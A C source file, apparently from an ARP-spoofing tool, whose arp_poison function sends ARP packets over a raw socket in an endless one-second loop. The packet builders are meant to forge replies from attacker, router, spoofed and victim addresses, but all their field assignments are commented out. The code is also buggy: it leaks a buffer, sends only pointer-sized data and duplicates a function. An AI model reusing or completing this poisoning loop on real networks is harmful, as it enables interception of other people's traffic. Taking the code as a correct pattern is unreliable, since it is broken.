#include "arp.h"

void arp_poison(struct config *c)
{
    int sd = 0;
    struct sockaddr_ll device;
    struct config *conf = (struct config *)c;
    struct arp_header *arp = (struct arp_header *)malloc(sizeof(struct arp_header));
    arp = build_arp(conf);

    memset(&device, 0, sizeof(device));
    device.sll_ifindex = if_nametoindex(conf->interfaceName);
    device.sll_family = AF_PACKET;

    // create socket
    if ((sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
    {
        printf("socket error\n");
        exit(1);
    }

    while (1)
    {
        sendto(sd, arp, sizeof(arp), 0, (struct sockaddr *)&device, sizeof(device));
        sleep(1);
        fprintf(stdout, "ARP\n");
    }
}

struct arp_header *build_arp(struct config *conf)
{
    struct arp_header *arp = malloc(sizeof(struct arp_header));

    // arp->hardware_type = htons(1);
    // arp->protocol_type = htons(ETH_P_IP);
    // arp->hardware_len = HARDWARE_LEN;
    // arp->protocol_len = IP_LEN;
    // arp->opcode = htons(2);

    // memcpy(&arp->sender_mac, conf->attackerMac, sizeof(uint8_t) * HARDWARE_LEN);
    // memcpy(&arp->target_mac, conf->routerMac, sizeof(uint8_t) * HARDWARE_LEN);
    // if (inet_pton(AF_INET, conf->spoofIP, arp->sender_ip) != 1 || inet_pton(AF_INET, conf->victimIP, arp->target_ip) != 1)
    //     return (NULL);

    return arp;
}

struct arp_header *build_arp_req(struct config *conf)
{
    struct arp_header *arp = malloc(sizeof(struct arp_header));

    // arp->hardware_type = htons(1);
    // arp->protocol_type = htons(ETH_P_IP);
    // arp->hardware_len = HARDWARE_LEN;
    // arp->protocol_len = IP_LEN;
    // arp->opcode = htons(2);

    // memcpy(&arp->sender_mac, conf->attackerMac, sizeof(uint8_t) * HARDWARE_LEN);
    // memcpy(&arp->target_mac, conf->routerMac, sizeof(uint8_t) * HARDWARE_LEN);
    // if (inet_pton(AF_INET, conf->spoofIP, arp->sender_ip) != 1 || inet_pton(AF_INET, conf->victimIP, arp->target_ip) != 1)
    //     return (NULL);

    return arp;
}